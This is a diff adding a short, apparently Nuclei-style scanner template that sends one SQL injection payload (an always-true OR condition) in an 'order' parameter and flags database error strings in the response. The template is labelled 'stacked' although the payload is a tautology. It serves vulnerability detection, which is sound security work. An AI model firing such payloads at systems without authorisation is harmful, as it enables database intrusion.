@@ -1,0 +1,25 @@
+id: sqli2-stacked-24
+name: 'SQLi stacked via order'
+severity: critical
+type: active
+tags:
+  - sqli
+  - injection
+  - stacked
+description: 'Extra SQL statement via order'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      order:
+        - ''') OR (''1''=''1''--'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'SQL syntax'
+          - 'mysql_fetch'
+          - 'PostgreSQL'
+          - 'ODBC'
+          - 'ORA-'
+          - 'SQLite'
